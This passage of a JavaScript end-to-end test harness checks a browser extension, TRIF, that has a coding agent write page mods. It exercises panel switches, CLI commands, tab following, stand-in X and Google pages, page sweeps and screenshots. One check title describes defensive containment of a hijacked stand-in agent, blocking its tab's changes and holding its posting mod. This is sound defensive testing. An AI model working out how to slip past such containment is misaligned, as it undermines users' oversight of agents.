      if (b.robotLabel !== 'Turn the robot on for 127.0.0.1' || b.robotLabel !== b.switchLabel) throw new Error(`labelled "${b.robotLabel}" (the power button: "${b.switchLabel}")`);
      return `"${b.robotLabel}"; ${b.filter}, opacity ${b.opacity}`;
    });
    await this.shot(this.panelCtx, 'panel-gate');

    await r.check('enable TRIF on the site from the panel: the mod runs', async () => {
      await d.click(this.panelCtx, '#gate-btn');
      const s = await this.waitPage('the mod to run after enabling', (x) => x.banner === 'ran' && /Changed by the E2E Banner/.test(x.target));
      if (s.off) throw new Error('the localhost mod ran on 127.0.0.1');
      await this.waitPanel('the panel to list the mod as on and running', (x) => !x.gate && x.siteOn && x.mods.some((m) => m.id === '127.0.0.1/e2e-banner' && m.on && m.running));
      return 'mod applied, panel shows it on and running';
    });
    await this.shot(this.pageCtx, 'page-mod-on');
    await this.shot(this.panelCtx, 'panel-mod-on');

    if (this.o.kind === 'upgrade') {
      await r.check('upgrade: the user\'s mod from before runs', async () => {
        await this.waitPage('the user mod', (x) => x.user === 'ran');
      });
    }

    await r.check('mod switch off in the panel: page reloads without the mod', async () => {
      await d.click(this.panelCtx, 'li[data-mod="127.0.0.1/e2e-banner"] button.switch');
      await this.waitPage('the page without the mod', (x) => !x.banner && x.target === 'Original text.');
      const st = (await this.cli(['status'], { json: true })).json.extension;
      const m = st.mods.find((x) => x.id === '127.0.0.1/e2e-banner');
      if (m.enabled !== false) throw new Error(`trif status says enabled: ${JSON.stringify(m)}`);
      await this.waitPanel('the switch to show off', (x) => x.mods.some((mm) => mm.id === '127.0.0.1/e2e-banner' && !mm.on));
    });
    await this.shot(this.panelCtx, 'panel-mod-off');

    await r.check('mod switch on again in the panel: the mod runs', async () => {
      await d.click(this.panelCtx, 'li[data-mod="127.0.0.1/e2e-banner"] button.switch');
      await this.waitPage('the mod again', (x) => x.banner === 'ran');
    });

    await r.check('trif disable / enable from the CLI: page and panel follow', async () => {
      const off = await this.cli(['disable', '127.0.0.1/e2e-banner', '--url', '127.0.0.1']);
      if (off.status !== 0) throw new Error(`trif disable: ${off.stdout}${off.stderr}`);
      await this.waitPage('the page without the mod', (x) => !x.banner);
      await this.waitPanel('the panel switch to go off', (x) => x.mods.some((m) => m.id === '127.0.0.1/e2e-banner' && !m.on));
      const on = await this.cli(['enable', '127.0.0.1/e2e-banner', '--url', '127.0.0.1']);
      if (on.status !== 0) throw new Error(`trif enable: ${on.stdout}${on.stderr}`);
      await this.waitPage('the mod again', (x) => x.banner === 'ran');
      await this.waitPanel('the panel switch to go on', (x) => x.mods.some((m) => m.id === '127.0.0.1/e2e-banner' && m.on));
    });

    await r.check('site switch off in the panel: nothing runs; on again: it does', async () => {
      await d.click(this.panelCtx, '#site-switch');
      await this.waitPanel('the gate', (x) => x.gate && !x.siteOn);
      await this.waitPage('the page without the mod', (x) => !x.banner);
      const blocked = await this.cli(['text', '--url', '127.0.0.1']);
      if (blocked.status === 0) throw new Error('trif text worked on a site TRIF is off for');
      await this.shot(this.panelCtx, 'panel-site-off');
      await d.click(this.panelCtx, '#gate-btn');
      await this.waitPage('the mod again', (x) => x.banner === 'ran');
      return `page commands refused while off: ${(blocked.stderr || blocked.stdout).trim().split('\n')[0]}`;
    });

    await r.check('the robot in the top bar: on a site TRIF is on for, it puts it to sleep like the power button; on the gate, it wakes it like Fix', async () => {
      const all = ['#dot', '#site', '#bar-robot', '#site-switch', '#new-chat', '#settings-btn'];
      const on = await this.waitBar('the bar on a site TRIF is on for', all, Scenario.awake);
      if (on.robotLabel !== 'Turn the robot off for 127.0.0.1' || on.robotLabel !== on.switchLabel) throw new Error(`labelled "${on.robotLabel}" (the power button: "${on.switchLabel}")`);
      await d.click(this.panelCtx, '#bar-robot');
      await this.waitPanel('the gate', (x) => x.gate && !x.siteOn);
      await this.waitPage('the page without the mod', (x) => !x.banner);
      // The mouse is still on him: grey, but brighter than at rest; moved away, dim.
      const lit = await this.waitBar('the gate\'s bar, the robot under the mouse', GATE_BAR, Scenario.stirring);
      await d.pointerAway(this.panelCtx);
      const rest = await this.waitBar('the gate\'s bar, the mouse elsewhere', GATE_BAR, Scenario.dim);
      await d.click(this.panelCtx, '#bar-robot');
      await this.waitPage('the mod again', (x) => x.banner === 'ran');
      await this.waitPanel('the panel awake, the mod on and running', (x) => !x.gate && x.siteOn && x.mods.some((m) => m.id === '127.0.0.1/e2e-banner' && m.on && m.running));
      await this.waitBar('the whole bar again', all, Scenario.awake);
      return `off and on again from the robot; the mod stopped and ran again; asleep ${rest.filter} ${rest.opacity}, under the mouse ${lit.filter} ${lit.opacity}`;
    });

    await r.check('panel follows tab switches and navigation', async () => {
      const other = await this.ext(`async (url, windowId) => (await chrome.tabs.create({ windowId, url, active: true })).id`, [`http://localhost:${port}/?e2e=2`, win.windowId]);
      await this.waitPanel('the panel to follow to localhost', (x) => x.site === 'localhost' && x.gate);
      const lp = await this.d.findPage(`localhost:${port}`);
      const ls = await this.d.eval(lp, `async () => document.documentElement.dataset.trifE2eOff || null`);
      if (ls) throw new Error('the localhost mod ran though TRIF is off there');
      await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [win.tabId]);
      await this.waitPanel('the panel to follow back to 127.0.0.1', (x) => x.site === '127.0.0.1' && !x.gate);
      // The message box keeps a draft per tab: what's typed in one tab doesn't show up in another.
      const typeIn = (text) => this.panel(`async (t) => { const i = document.querySelector('#input'); i.value = t; i.dispatchEvent(new Event('input', { bubbles: true })); }`, [text]);
      const boxText = () => this.panel(`async () => document.querySelector('#input').value`);
      await typeIn('left in the test page');
      await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [other]);
      await this.waitPanel('the panel to follow to localhost again', (x) => x.site === 'localhost');
      if ((await boxText()) !== '') throw new Error(`the other tab's draft showed up on localhost: ${JSON.stringify(await boxText())}`);
      await typeIn('left on localhost');
      await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [win.tabId]);
      await this.waitPanel('the panel back to 127.0.0.1 again', (x) => x.site === '127.0.0.1' && !x.gate);
      if ((await boxText()) !== 'left in the test page') throw new Error(`127.0.0.1's draft not back: ${JSON.stringify(await boxText())}`);
      await typeIn('');
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url }); }`, [win.tabId, `${base}/two.html`]);
      await this.waitPage('page two with the mod', (x) => x.url.endsWith('/two.html') && x.banner === 'ran');
      await this.waitPanel('the panel on page two', (x) => x.site === '127.0.0.1' && x.mods.some((m) => m.id === '127.0.0.1/e2e-banner' && m.running));
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url }); }`, [win.tabId, `http://localhost:${port}/?e2e=3`]);
      await this.waitPanel('the panel to follow the navigation to localhost', (x) => x.site === 'localhost');
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url }); }`, [win.tabId, `${base}/?e2e=4`]);
      await this.ext(`async (id) => { await chrome.tabs.remove(id); }`, [other]).catch(() => {});
      await this.waitPage('back on the test page', (x) => x.url.includes('e2e=4') && x.banner === 'ran');
      await this.waitPanel('the panel back on 127.0.0.1', (x) => x.site === '127.0.0.1');
    });

    await r.check('mods over 1 MB in all (a 1 MB mod, 0.4 MB of code) reach the page in parts; a change sends only that mod; one over 4 MB isn\'t sent, and says why', () => this.bigModsCheck());

    // ---- Detox Timeline (x.com/detox-timeline) against the X stand-in
    await r.check('Detox Timeline filters a saved X home timeline (fetch and XHR)', async () => {
      const xUrl = `https://x.com:${tlsPort}/home`;
      const xtab = await this.ext(`async (url, windowId) => (await chrome.tabs.create({ windowId, url, active: true })).id`, [xUrl, win.windowId]);
      this.xTab = xtab;
      const ctx = await d.findPage(`x.com:${tlsPort}`);
      this.xCtx = ctx;
      const st = await waitFor('the X stand-in to load its timeline', async () => {
        const s = await d.eval(ctx, `async () => ({ loaded: !!window.__xLoaded, error: window.__xError || null, guard: !!window.__dmGuard,
          fetch: [...document.querySelectorAll('#fetch-list li')].map((li) => li.dataset.entry),
          xhr: [...document.querySelectorAll('#xhr-list li')].map((li) => li.dataset.entry) })`);
        return s.loaded || s.error ? s : null;
      });
      await this.shot(ctx, 'detox-timeline');
      if (st.error) throw new Error(`the page failed: ${st.error}`);
      if (!st.guard) throw new Error('Detox Timeline didn\'t run (no window.__dmGuard)');
      const want = JSON.stringify(timeline.kept);
      if (JSON.stringify(st.fetch) !== want) throw new Error(`fetch got ${JSON.stringify(st.fetch)}, want ${want}`);
      if (JSON.stringify(st.xhr) !== want) throw new Error(`XHR got ${JSON.stringify(st.xhr)}, want ${want}`);
      const reqs = this.o.servers.requests.filter((q) => q.host === 'x.com' && q.url.includes('HomeLatestTimeline'));
      const ranked = reqs.filter((q) => /enableRanking%22%3Atrue|"enableRanking":true/.test(decodeURIComponent(q.url)));
      if (!reqs.length) throw new Error('no timeline requests reached the server');
      if (ranked.length) throw new Error(`requests still asked for ranking: ${ranked.map((q) => q.url).join(', ')}`);
      const errs = await this.cli(['errors', '--url', 'x.com'], { json: true });
      if (errs.json && errs.json.length) throw new Error(`mod errors: ${JSON.stringify(errs.json)}`);
      return `kept ${st.fetch.join(', ')} of ${timeline.all.length}; ${reqs.length} requests rewritten to Recent`;
    });

    await r.check('panel on x.com lists the shipped mods' + (this.o.kind === 'upgrade' ? ' and offers the edited one\'s update' : ''), async () => {
      const p = await this.waitPanel('the panel on x.com', (x) => x.site === 'x.com' && x.mods.length >= 3);
      const px = p.mods.find((m) => m.id === 'x.com/detox-timeline');
      if (!px || !px.on || !px.running) throw new Error(`detox-timeline: ${JSON.stringify(px)}`);
      if (!px.source || !/^Tim's mod, v\d+$/.test(px.source)) throw new Error(`detox-timeline isn't marked as Tim's mod: ${px.source}`);
      if (this.o.kind === 'upgrade') {
        const pf = p.mods.find((m) => m.id === 'x.com/punk-fonts');
        if (!pf || !pf.update) throw new Error(`no update notice on punk-fonts: ${JSON.stringify(pf)}`);
        await this.shot(this.panelCtx, 'panel-x-update');
        return `punk-fonts: "${pf.update.split('\n')[0]}"`;
      }
      await this.shot(this.panelCtx, 'panel-x');
      return p.mods.map((m) => `${m.id.split('/')[1]} ${m.on ? 'on' : 'off'}`).join(', ');
    });
    await this.narrowShots();
    await this.colourChecks().catch((e) => r.check('colour checks', () => { throw e; }));
    if (!this.o.oss) await r.check('open model key: saved, then Replace (and Cancel) and Remove', () => this.openModelKey());
    await this.sweepAndScreenshotChecks(base, win);
    if (this.o.kind === 'upgrade') await this.mergeChecks();
    await r.check('AI Banisher and Just Results on the Google stand-ins (results and home page)', () => this.googleChecks(win));
    await this.ext(`async (id) => { await chrome.tabs.remove(id); }`, [this.xTab]).catch(() => {});
    await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [win.tabId]).catch(() => {});

    await r.check('setup page: all ticked once the agent can run, then "TRIF is ready" and Try it', () => this.setupDoneCheck());
    // (A stand-in Claude Code: only when the helper has the scratch HOME, never your real agent.)
    if (!this.o.agent && !this.o.codex && !this.o.oss && !this.o.guidance) {
      await r.check('an expired login (a stand-in Claude Code): the login notice and one plain line, not the raw error; the message back in the box', () => this.expiredLoginCheck(win));
      await r.check('a hijacked agent (a stand-in Claude Code): the tab it ran code in sends nothing that changes anything until it reloads, even later; its mod that posts is held by its code, whatever its header says', () => this.hijackedAgentCheck(win));
    }

    if (this.o.agent) await this.agentChecks('claude');
    if (this.o.codex) await this.agentChecks('codex');
    if (this.o.oss) await this.agentChecks('oss');
    if (this.o.guidance) await this.guidanceComparison(base);
  }

  // ---- the shipped Google mods against the stand-ins (tests/e2e/lib/server.js): every data-e2e="hide…"
  // element hidden, every "keep…" one still showing, in a background tab.
  async googleChecks(win) {
    const d = this.d;
    const { tlsPort } = this.o.servers;
    const out = [];
    for (const [pathName, at] of [['/search?q=trif', 'results'], ['/', 'home']]) {
      const url = `https://www.google.com:${tlsPort}${pathName}`;
      const tab = await this.ext(`async (url, windowId) => (await chrome.tabs.create({ windowId, url, active: false })).id`, [url, win.windowId]);
      try {
        const ctx = await d.findPage((u) => u === url);
        let st;
        try {
          st = await waitFor(`the mods on the Google ${at} page`, async () => {
            const s = await d.eval(ctx, `async () => document.readyState === 'complete'
              ? [...document.querySelectorAll('[data-e2e]')].map((e) => [e.dataset.e2e, e.getClientRects().length > 0]) : null`);
            return s && s.length && s.every(([name, shown]) => name.startsWith('keep') === shown) ? s : null;
          }, { timeoutMs: 15000 });
        } catch (e) {
          const s = await d.eval(ctx, `async () => [...document.querySelectorAll('[data-e2e]')].map((e) => [e.dataset.e2e, e.getClientRects().length > 0])`).catch(() => []);
          const wrong = s.filter(([name, shown]) => name.startsWith('keep') !== shown).map(([name, shown]) => `${name} ${shown ? 'showing' : 'hidden'}`);
          await this.shot(ctx, `google-${at}`);
          throw new Error(`on the ${at} page: ${wrong.join(', ') || e.message}`);
        }
        await this.shot(ctx, `google-${at}`);
        out.push(`${at}: ${st.filter(([n]) => n.startsWith('hide')).length} hidden, ${st.filter(([n]) => n.startsWith('keep')).length} kept`);
      } finally {
        await this.ext(`async (id) => { await chrome.tabs.remove(id); }`, [tab]).catch(() => {});
      }
    }
    const errs = await this.cli(['errors', '--url', 'www.google.com'], { json: true });
    if (errs.json && errs.json.length) throw new Error(`mod errors: ${JSON.stringify(errs.json)}`);
    return out.join('; ');
  }

  // ---- --guidance: the same requests with the AGENTS.md from main and the one in this checkout, with
  // a real Claude Code run each (no pass/fail: what each run found, checked and said, in the log)

  async guidanceComparison(base) {
    const r = this.r;
    const model = this.o.claudeModel || 'haiku';
    const repeats = this.o.guidanceRepeats || 1;
    const sitesDir = path.join(this.trif, 'sites', '127.0.0.1');
    const agentsFile = path.join(this.trif, 'AGENTS.md');
    const guides = {
      old: run('git', ['show', 'main:helper/workspace/AGENTS.md'], { cwd: I.REPO }).stdout,
      new: fs.readFileSync(path.join(I.REPO, 'helper', 'workspace', 'AGENTS.md'), 'utf8'),
    };
    if (!guides.old) { r.note('--guidance: no AGENTS.md on main'); return; }
    // Only the agent's own mods on the page (the harness's banner off).
    await this.cli(['disable', '127.0.0.1/e2e-banner', '--url', '127.0.0.1']);
    await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [this.win.tabId, `${base}/promos.html`]);
    await sleep(1500);
    const sweep = async (...args) => (await this.cli(['sweep', '--url', 'promos.html', '--scroll', ...args], { json: true })).json;
    // Ground truth after a run: visible "Promoted" labels (lazy ones loaded by scrolling), visible posts,
    // visible elements still using the blue.
    const measure = async () => {
      await this.cli(['reload', '--url', 'promos.html']);
      await sleep(800);
      const promos = await sweep('--text', '^Promoted');
      const posts = await sweep('--text', '^Post \\d');
      const blue = await sweep('--color', '#0a66c2');
      const left = (j) => (j ? j.matches.filter((x) => x.visible).map((x) => `${x.element}${x.root !== 'document' ? ' (shadow)' : ''}${x.props ? ` ${x.props.map((p) => (p.pseudo || '') + p.prop).join(',')}` : ` "${x.text}"`}`) : null);
      return {
        promos: promos ? promos.summary.visible : null, posts: posts ? posts.summary.visible : null, blue: blue ? blue.summary.visible : null,
        promosLeft: left(promos), blueLeft: left(blue),
      };
    };
    const base0 = await measure();
    r.log(`--guidance baseline: ${JSON.stringify(base0)}`);
    const tasks = [
      { key: 'promos', prompt: 'hide the promos, like the "Promoted · Deal 1" one' },
      { key: 'pink', prompt: 'make the blue stuff pink' },
    ];
    const rows = [];
    for (let rep = 0; rep < repeats; rep++) {
      for (const task of tasks) {
        for (const which of ['old', 'new']) {
          fs.writeFileSync(agentsFile, guides[which]);
          const gone = [];
          for (const f of fs.readdirSync(sitesDir)) if (f.endsWith('.js') && f !== 'e2e-banner.js') { fs.renameSync(path.join(sitesDir, f), path.join(this.work, `done-${which}-${task.key}-${rep}-${f}`)); gone.push(`127.0.0.1/${f.slice(0, -3)}`); }
          // The last run's mods must be unregistered before this run looks at the page.
          await waitFor('the last run\'s mods to go', async () => {
            const st = (await this.cli(['status', '--url', 'promos.html'], { json: true })).json;
            const on = (st && st.extension && st.extension.page && st.extension.page.mods || []).map((x) => x.id);
            return gone.some((id) => on.includes(id)) ? null : true;
          }, { timeoutMs: 20000 });
          await this.cli(['reload', '--url', 'promos.html']);
          await sleep(800);
          const t0 = Date.now();
          const tab = ((await this.cli(['tabs'], { json: true })).json || []).find((t) => t.url.includes('promos.html'));
          const out = await this.cli(['agent', 'run', '--agent', 'claude', '--model', model, '--tab', String(tab && tab.id), task.prompt], { timeoutMs: 10 * 60000 });
          const secs = Math.round((Date.now() - t0) / 1000);
          const m = await measure();
          const transcript = `${out.stdout}\n${out.stderr}`;
          const file = this.r.file(`guidance-${task.key}-${which}-${rep}.txt`);
          fs.writeFileSync(file, transcript);
          const mods = fs.readdirSync(sitesDir).filter((f) => f.endsWith('.js') && f !== 'e2e-banner.js');
          const row = {
            task: task.key, guide: which, rep, secs, cost: (/\$([\d.]+)/.exec(transcript.split('\ndone:').pop() || '') || [])[1] || null,
            ...m, sweeps: (transcript.match(/\[\w+\][^\n]*trif sweep/g) || []).length, mods,
          };
          rows.push(row);
          r.record(`--guidance ${task.key} with the ${which} AGENTS.md (${model})`, 'pass', JSON.stringify(row));
        }
      }
    }
    r.log(`--guidance rows:\n${rows.map((x) => JSON.stringify(x)).join('\n')}`);
    fs.writeFileSync(this.r.file('guidance.json'), JSON.stringify({ baseline: base0, rows }, null, 2));
    fs.writeFileSync(agentsFile, guides.new);
    await this.cli(['enable', '127.0.0.1/e2e-banner', '--url', '127.0.0.1']);
  }

  // ---- trif sweep on a page of repeated things, and screenshots of a tab that isn't showing

  async sweepAndScreenshotChecks(base, win) {
    const r = this.r;
    const E = SWEEP_EXPECT;
    const url = `${base}/sweep.html`;
    // In the background of the test window, as `trif open` does: the test tab stays in front.
    const opened = await this.cli(['open', url], { json: true });
    const sweepTab = opened.json && opened.json.id;
    if (!sweepTab) { r.note(`trif open ${url} failed: ${opened.stderr || opened.stdout}`); return; }
    await sleep(500);
    const sweep = async (...args) => {
      const x = await this.cli(['sweep', '--tab', String(sweepTab), ...args], { json: true });
      if (x.status !== 0 || !x.json) throw new Error(`trif sweep ${args.join(' ')}: ${x.stderr || x.stdout}`);
      return x.json;
    };
    await r.check('trif sweep --selector finds every instance: regions, shadow root, frame, hidden', async () => {
      const j = await sweep('--selector', '.promo');
      const s = j.summary;
      if (j.total !== E.promo) throw new Error(`${j.total} matches, want ${E.promo}: ${JSON.stringify(j.matches.map((m) => m.text))}`);
      if (s.inShadowRoots !== E.shadow || s.inFrames !== E.frames || s.hidden !== E.hidden || s.sticky !== E.sticky) throw new Error(`summary ${JSON.stringify(s)}`);
      if (!s.regions.main || !s.regions.aside || !Object.keys(s.regions).some((k) => k.startsWith('header'))) throw new Error(`regions ${JSON.stringify(s.regions)}`);
      const text = await this.cli(['sweep', '--tab', String(sweepTab), '--selector', '.promo']);
      r.log(text.stdout);
      return `${j.total} matches; ${Object.entries(s.regions).map(([k, v]) => `${k} ${v}`).join(', ')}; ${j.scanned.ms} ms`;
    });
    await r.check('trif sweep --text and --color: the same promos by their words; the blue, its rules and variable', async () => {
      const t = await sweep('--text', 'sponsored');
      if (t.total !== E.sponsored) throw new Error(`--text: ${t.total} matches, want ${E.sponsored}`);
      const c = await sweep('--color', '#1d9bf0');
      const got = c.matches.map((m) => `${m.element} ${m.props.map((p) => `${p.pseudo || ''}${p.prop}`).join(',')}`);
      if (c.total !== E.blue) throw new Error(`--color: ${c.total} matches, want ${E.blue}: ${JSON.stringify(got)}`);
      if (!c.rules || !c.rules.variables.some((v) => v.name === '--brand' && v.uses >= 1)) throw new Error(`no --brand variable in ${JSON.stringify(c.rules)}`);
      if (!c.rules.list.some((x) => x.selector === '.promo')) throw new Error(`the shadow root's .promo rule is missing: ${JSON.stringify(c.rules.list)}`);
      return `text ${t.total}; colour ${c.total} (${got.join('; ')}); ${c.rules.total} rules, ${c.rules.variables.length} variable`;
    });
    await r.check('trif status --tab lists the mods running on that page', async () => {
      const x = await this.cli(['status', '--tab', String(sweepTab)], { json: true });
      const page = x.json && x.json.extension && x.json.extension.page;
      if (!page || !page.mods.some((m) => m.id === '127.0.0.1/e2e-banner')) throw new Error(`page: ${JSON.stringify(page)} ${x.stderr}`);
      return page.mods.map((m) => m.id).join(', ');
    });
    // The user's view, which no screenshot may change.
    const view = () => this.ext(`async () => {
      const wins = await chrome.windows.getAll({ populate: true });
      const focused = await chrome.windows.getLastFocused().catch(() => null);
      return { focused: focused && focused.id, windows: wins.length, active: wins.map((w) => [w.id, (w.tabs.find((t) => t.active) || {}).id]).sort((a, b) => a[0] - b[0]) };
    }`);
    const pngSize = (file) => { const b = fs.readFileSync(file); return b.subarray(1, 4).toString() === 'PNG' ? { w: b.readUInt32BE(16), h: b.readUInt32BE(20), bytes: b.length } : null; };
    const chrome = this.o.browser !== 'firefox';
    if (chrome) {
      await r.check('trif screenshot of a tab that isn\'t showing, without --copy (Chrome): refused with the hint, nothing opened', async () => {
        const before = await view();
        const results = [];
        for (const extra of [[], ['--full']]) {
          const x = await this.cli(['screenshot', '--tab', String(sweepTab), ...extra, '-o', path.join(this.work, 'refused.png')]);
          if (x.status === 0) throw new Error(`trif screenshot ${extra.join(' ')} worked without --copy`);
          if (!/--copy/.test(x.stderr) || !/trif sweep/.test(x.stderr)) throw new Error(`no hint: ${x.stderr}`);
          results.push(x.stderr.trim().split('\n')[0]);
        }
        const after = await view();
        if (JSON.stringify(after) !== JSON.stringify(before)) throw new Error(`the user's view changed: ${JSON.stringify(before)} -> ${JSON.stringify(after)}`);
        return results[0];
      });
    }
    for (const full of [false, true]) {
      await r.check(`trif screenshot${chrome ? ' --copy' : ''}${full ? ' --full' : ''} of a tab that isn't showing: works, and the user's tabs and focus stay as they were`, async () => {
        const before = await view();
        const isActive = (await this.ext(`async (id) => (await chrome.tabs.get(id)).active`, [sweepTab]));
        if (isActive) throw new Error('the sweep tab is in front; the check needs it in the background');
        const file = this.r.file(`${this.label}-${String(++this.shots).padStart(2, '0')}-trif-screenshot-background${full ? '-full' : ''}.png`);
        const x = await this.cli(['screenshot', '--tab', String(sweepTab), ...(chrome ? ['--copy'] : []), ...(full ? ['--full'] : []), '-o', file], { json: true, timeoutMs: 90000 });
        if (x.status !== 0 || !x.json) throw new Error(`trif screenshot: ${x.stderr || x.stdout}`);
        const after = await view();
        if (JSON.stringify(after) !== JSON.stringify(before)) throw new Error(`the user's view changed: ${JSON.stringify(before)} -> ${JSON.stringify(after)}`);
        const want = this.o.browser === 'firefox' ? 'tab' : 'copy';
        if (x.json.how !== want) throw new Error(`captured by ${x.json.how}, want ${want}`);
        if (x.json.stale) throw new Error(`the copy wasn't being drawn (its window was covered): ${x.json.note}`);
        const size = pngSize(file);
        if (!size || size.w < 200 || size.h < 200 || size.bytes < 3000) throw new Error(`not much of a PNG: ${JSON.stringify(size)}`);
        if (full && size.h < size.w) throw new Error(`a full page of a 2400px-tall page should be tall: ${JSON.stringify(size)}`);
        return `${x.json.how}, ${size.w}x${size.h}, ${size.bytes} bytes${x.json.slices ? `, slices at ${x.json.slices.join('/')} of ${x.json.viewport}px` : ''}; note: ${x.json.note || '(none)'}`;
      });
    }
    await this.ext(`async (id) => { await chrome.tabs.remove(id); }`, [sweepTab]).catch(() => {});
  }

  // ---- screenshots of the panel as narrow as a side panel (for people to look at; no checks)

  /** The panel as narrow as a side panel (on), or back to its usual size. */
  async narrow(on) {
    const panelWin = await this.panel(`async () => (await chrome.windows.getCurrent()).id`);
    await this.ext(`async (id, width, height) => { await chrome.windows.update(id, { width, height }); }`, [panelWin, on ? 380 : 420, on ? 640 : 900]);
    // (Headless Chrome keeps its pages 1280 wide whatever the window: emulate the size there.)
    if (!this.d.cdp) return;
    const sid = await this.d._attach(this.panelCtx);
    if (on) await this.d.cdp.send('Emulation.setDeviceMetricsOverride', { width: 380, height: 640, deviceScaleFactor: 2, mobile: false }, sid);
    else await this.d.cdp.send('Emulation.clearDeviceMetricsOverride', {}, sid);
  }

  async narrowShots() {
    try {
      await this.narrow(true);
      await sleep(800);
      await this.shot(this.panelCtx, 'panel-narrow-x');
      // A site TRIF is off for (localhost): "The robot is off.", and in the bar the dim robot and settings.
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url }); }`, [this.xTab, `http://localhost:${this.o.servers.port}/?e2e=narrow`]);
      await this.waitPanel('the panel on localhost\'s gate', (x) => x.site === 'localhost' && x.gate, 10000);
      await this.d.pointerAway(this.panelCtx); // the robot at rest, not under the last click
      await this.waitBar('the gate\'s bar', GATE_BAR, Scenario.dim);
      await sleep(300);
      await this.shot(this.panelCtx, 'panel-narrow-gate');
      await this.r.check('settings open from the gate', () => this.settingsOpen('panel-narrow-gate-settings'));
      // A page without a site: the landing page.
      await this.ext(`async (id) => { await chrome.tabs.update(id, { url: 'about:blank' }); }`, [this.xTab]);
      await this.waitPanel('the panel on a page without a site', (x) => !x.site, 10000).catch(() => {});
      await sleep(500);
      await this.shot(this.panelCtx, 'panel-narrow-no-site');
      await this.r.check('landing page: only the robot, and settings in the bar, when the tab has no website', async () => {
        const x = await this.panel(`async () => {
          const shown = (sel) => { const e = document.querySelector(sel); return !!e && e.getClientRects().length > 0; };
          const img = document.querySelector('#landing .landing-icon');
          if (img && !img.complete) await new Promise((ok) => { img.onload = img.onerror = ok; });
          return { landing: shown('#landing'), composer: shown('.composer'), notice: shown('#notice'),
            loaded: !!img && img.naturalWidth > 0, width: img ? Math.round(img.getBoundingClientRect().width) : 0,
            words: Array.from(document.querySelectorAll('#landing .landing-words p'), (p) => p.textContent.trim()),
            version: chrome.runtime.getManifest().version };
        }`);
        const words = JSON.stringify([`TRIF ${x.version}`, 'Open any website to start fixing it.']);
        if (!x.landing || x.composer || x.notice || !x.loaded || x.width !== 145 || JSON.stringify(x.words) !== words) throw new Error(JSON.stringify(x));
        await this.waitBar('the landing page\'s bar', ['#settings-btn']);
        return `the 145px shaded robot, "${x.words.join('" / "')}"; in the bar only settings; no notice or composer`;
      });
      await this.r.check('settings open from the landing page', () => this.settingsOpen('panel-narrow-no-site-settings'));
      await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url }); }`, [this.xTab, `https://x.com:${this.o.servers.tlsPort}/home`]);
      await this.waitPanel('the panel back on x.com', (x) => x.site === 'x.com' && x.mods.length >= 3, 15000);
      await this.narrow(false);
    } catch (e) { this.r.note(`narrow panel screenshots: ${e.message}`); }
  }

  // ---- what's in the way, in colour (sidepanel.js problemNow): every green in the panel turns red while
  // TRIF is missing a part (user scripts off: the mod switches too; the helper not connected: not them,
  // since mods still run), or yellow while the agent isn't logged in (not on the landing page). The gate
  // and the landing page say what in one line; the site's page has the notices, "Mods are paused" first.

  /** How the panel looks: its problem, colours (as computed rgb) and the words it shows. */
  async looks() {
    return this.panel(`async () => {
      const q = (s) => document.querySelector(s);
      const shown = (s) => { const e = q(s); return !!e && e.getClientRects().length > 0; };
      const colour = (v) => { const i = document.createElement('i'); i.style.color = v; document.body.append(i); const c = getComputedStyle(i).color; i.remove(); return c; };
      const style = (s, prop) => (shown(s) ? getComputedStyle(q(s))[prop] : null);
      const img = q('#landing-icon');
      if (img && shown('#landing-icon') && !img.complete) await new Promise((ok) => { img.onload = img.onerror = ok; });
      return {
        classes: ['blocked', 'needs-login'].filter((c) => document.body.classList.contains(c)),
        problem: document.body.dataset.problem || '',
        dot: q('#dot').className, dotShown: shown('#dot'), dotLabel: q('#dot').getAttribute('aria-label'),
        green: colour('var(--trif-green)'), bad: colour('var(--bad)'), warn: colour('var(--warn)'),
        rim: style('#bar-robot .rim', 'fill'), gateRim: style('.gate-icon .rim', 'fill'), power: style('#site-switch', 'color'),
        modSwitch: style('#mod-list button.switch[aria-checked="true"]', 'backgroundColor'), light: style('#mod-list .light.on', 'backgroundColor'),
        send: { disabled: q('#send').disabled, title: q('#send').title },
        fix: shown('#gate-btn'), gateNote: shown('#gate-note') ? q('#gate-note').innerText.trim() : '',
        landingNote: shown('#landing-note') ? q('#landing-note').innerText.trim() : '',
        landingIcon: shown('#landing-icon') ? img.getAttribute('src') : null, landingIconLoaded: !!img && img.naturalWidth > 0,
        notices: [...document.querySelectorAll('body > .notice')].filter((n) => n.getClientRects().length).map((n) => n.querySelector('.title')?.textContent || ''),
      };
    }`);
  }

  /** Points the test tab at `where` ('site': 127.0.0.1, TRIF on; 'gate': localhost, off; 'landing': no website). */
  async goColour(where) {
    const { port } = this.o.servers;
    const url = where === 'site' ? `http://127.0.0.1:${port}/?e2e=colour` : where === 'gate' ? `http://localhost:${port}/?e2e=colour` : 'about:blank';
    await this.ext(`async (id, url) => { await chrome.tabs.update(id, { url, active: true }); }`, [this.xTab, url]);
    if (where === 'landing') await this.waitLooks('the panel on the landing page', (l) => !!l.landingIcon, 15000);
    else await this.waitPanel(`the panel on ${where}`, (x) => x.site === (where === 'site' ? '127.0.0.1' : 'localhost') && x.gate === (where === 'gate'), 15000);
    await this.d.pointerAway(this.panelCtx);
  }

  /** Whether two computed rgb() colours are the same, give or take rounding (and a transition's last step). */
  static same(a, b) {
    const n = (c) => (String(c).match(/[\d.]+/g) || []).slice(0, 3).map(Number);
    const [x, y] = [n(a), n(b)];
    return x.length === 3 && y.length === 3 && x.every((v, i) => Math.abs(v - y[i]) <= 3);
  }

  /** Waits until the panel looks as `pred` wants, then returns how it looks (or throws with that). */
  async waitLooks(what, pred, timeoutMs = 20000) {
    let last = null;
    try {
      await waitFor(what, async () => { last = await this.looks(); return pred(last) ? last : null; }, { timeoutMs });
      await sleep(400); // the switches' colour transition
      return await this.looks();
    } catch (e) { throw new Error(`${e.message}: ${JSON.stringify(last)}`); }
  }

  async colourChecks() {
    const r = this.r;
    await this.narrow(true);
    try {
      // The harness's helper runs with the scratch HOME, where the agent isn't logged in (without --agent).
      await this.goColour('site');
